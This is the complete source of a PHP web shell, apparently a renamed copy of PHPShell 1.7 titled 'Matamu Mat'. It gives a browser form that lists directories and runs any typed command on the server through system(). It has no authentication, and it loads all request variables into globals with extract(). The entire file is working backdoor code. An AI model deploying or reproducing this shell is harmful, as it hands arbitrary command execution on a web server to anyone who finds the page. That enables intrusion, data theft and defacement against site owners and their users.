<?php

define('PHPSHELL_VERSION', '1.7');

?>

<html>
<head>
<title> Matamu Mat </title>
</head>
<body>
<hr><br>

<?php

if (ini_get('register_globals') != '1') {
  
  if (!empty($HTTP_POST_VARS))
    extract($HTTP_POST_VARS);
  
  if (!empty($HTTP_GET_VARS))
    extract($HTTP_GET_VARS);

  if (!empty($HTTP_SERVER_VARS))
    extract($HTTP_SERVER_VARS);
}


if (!empty($work_dir)) {
  
  if (!empty($command)) {
    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {
      
      if ($regs[1][0] == '/') {
        $new_dir = $regs[1]; 
      } else {
        $new_dir = $work_dir . '/' . $regs[1]; 
      }
      if (file_exists($new_dir) && is_dir($new_dir)) {
        $work_dir = $new_dir;
      }
      unset($command);
    }
  }
}

if (file_exists($work_dir) && is_dir($work_dir)) {
  
  chdir($work_dir);
}


$work_dir = exec('pwd');

?>

<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
<p>Current working directory: <b>
<?php

$work_dir_splitted = explode('/', substr($work_dir, 1));

echo '<a href="' . $PHP_SELF . '?work_dir=/">Root</a>/';

if (!empty($work_dir_splitted[0])) {
  $path = '';
  for ($i = 0; $i < count($work_dir_splitted); $i++) {
    $path .= '/' . $work_dir_splitted[$i];
    printf('<a href="%s?work_dir=%s">%s</a>/',
           $PHP_SELF, urlencode($path), $work_dir_splitted[$i]);
  }
}

?></b></p>
<p>Choose new working directory:
<select name="work_dir" onChange="this.form.submit()">
<?php

$dir_handle = opendir($work_dir);

while ($dir = readdir($dir_handle)) {
  if (is_dir($dir)) {
    if ($dir == '.') {
      echo "<option value=\"$work_dir\" selected>Current Directory</option>\n";
    } elseif ($dir == '..') {
      
      if (strlen($work_dir) == 1) {
	
      } elseif (strrpos($work_dir, '/') == 0) {
	
      echo "<option value=\"/\">Parent Directory</option>\n";
      } else {
      
      echo "<option value=\"". strrev(substr(strstr(strrev($work_dir), "/"), 1)) ."\">Parent Directory</option>\n";
      }
    } else {
      if ($work_dir == '/') {
	echo "<option value=\"$work_dir$dir\">$dir</option>\n";
      } else {
	echo "<option value=\"$work_dir/$dir\">$dir</option>\n";
      }
    }
  }
}
closedir($dir_handle);

?>

</select></p>

<p>Command: <input type="text" name="command" size="60">
<input name="submit_btn" type="submit" value="Execute Command"></p>

<p>Enable <code>stderr</code>-trapping? <input type="checkbox" name="stderr"></p>
<textarea cols="80" rows="20" readonly>

<?php
if (!empty($command)) {
  if ($stderr) {
    $tmpfile = tempnam('/tmp', 'phpshell');
    $command .= " 1> $tmpfile 2>&1; " .
    "cat $tmpfile; rm $tmpfile";
  } else if ($command == 'ls') {
    
    $command .= ' -F';
  }
  system($command);
}
?>

</textarea>
</form>

<script language="JavaScript" type="text/javascript">
document.forms[0].command.focus();
</script>

<hr>

</body>
</html>
